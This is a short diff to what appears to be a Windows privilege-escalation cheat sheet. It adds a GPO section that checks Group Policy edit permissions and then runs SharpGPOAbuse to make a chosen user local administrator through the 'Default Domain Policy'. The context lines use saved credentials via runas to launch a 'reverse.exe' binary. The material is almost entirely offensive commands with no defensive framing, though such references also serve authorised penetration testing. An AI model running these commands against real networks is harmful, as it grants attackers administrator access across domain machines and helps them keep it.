@@ -646,6 +646,16 @@ cmdkey /list
 ```ps
 runas /savecred /user:admin C:\Temp\reverse.exe
 ```
+
+### GPO
+#### Check for GpoEditDeleteModifySecurity
+```ps
+Get-GPPermission -Name "Default Domain Policy" -All
+```
+####
+```ps
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"
+```
   
 </details>
 
